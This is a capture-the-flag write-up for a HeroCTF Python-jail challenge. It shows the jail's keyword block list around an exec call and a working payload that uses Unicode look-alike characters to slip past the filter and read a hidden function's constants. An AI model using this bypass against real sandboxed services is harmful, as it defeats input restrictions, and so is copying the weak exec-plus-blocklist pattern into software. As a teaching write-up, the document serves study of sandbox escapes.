# HeroCTFv4 - pyjAil_iS_Mad

### Category

Misc

### Description

The pyjail isn't designed to pop a shell, or read a file. Just recover the redacted part of the source code.

**Host** : misc.heroctf.fr

**Port** : 6000

Format : **Hero{flag}**
Author : **Log_s**

### Files

**pyjail_redacted.py**

So, we have the source code of the pyjail:

```python
def flag():
    # REDACTED
    # THIS FUNCTION DOES NOT PRINT OR RETURN ANYTHING
    pass

def jail():
    user_input = input(">> ")

    filtered = ["import", "os", "sys", "eval", "exec", "__builtins__", "__globals__", "__getattribute__", "__dict__", "__base__", "__class__", "__subclasses__", "dir", "help", "exit", "open", "read"]

    valid_input = True
    for f in filtered:
        if f in user_input:
            print("tssss, what are u doing")
            valid_input = False
            break
    
    if valid_input:
        try:
            exec(user_input, {"__builtins__": {}}, {'flag':flag})
        except:
            print("You thought I would print errors for u ?")

if __name__ == "__main__":
    try:
        while True:
            jail()
    except KeyboardInterrupt:
        print("Bye")
```

It allows us to see the filters and to bypass them. I’m not a beginner at pyjail escape but this one was pretty hard with all this filters and the `builtins` disabled. 
What is the `builtins` in python ? It’s a module that gives you acces to native functions in python, for example the real name of the print() function is builtins.print()

## The exploit

As we can see, if we send a filtered string, it returns us : “tssss, what are u doing”.

But, the code only check UTF-8 chars (the default encoding in python), but python can handle multiple encodings, like Unicode !

So we just have to create a basic pyjail payload to read the content of a function and encode the filtered strings in Unicode, like this : 

flag.**𝗀𝗅𝗈𝖻𝖺𝗅𝗌**['**buil'+'tins**'].print(flag.**𝗀𝗅𝗈𝖻𝖺𝗅𝗌**['**buil'+'tins**'].getattr(flag.**code**,'co_consts'))

And the flag apprears :

![Untitled](images
/Untitled.png)

Flag : Hero{pyth0n_4ss3mbly}